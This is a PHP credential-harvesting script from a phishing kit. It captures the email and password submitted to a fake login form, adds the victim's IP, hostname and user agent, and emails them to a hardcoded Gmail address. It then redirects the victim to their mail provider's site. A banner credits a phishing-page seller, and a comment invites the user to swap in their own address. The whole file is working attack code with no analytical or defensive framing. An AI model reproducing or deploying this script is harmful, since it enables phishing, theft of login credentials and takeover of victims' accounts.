<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
    
	$data=  explode('@',$_POST["email"]);
    $Host = 'http://'.$data[1];
	$data2 = explode('.',$Host);
	$HostSub = $data[1];
	
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['email']."\n";
$message .= "Password:  ".$_POST['password']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
//change ur email here
$to = "fudpages@gmail.com";
$subject = "Login | $ip";
{
mail("$to", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: $Host");
}else{
header ("Location: index.html");
}

?>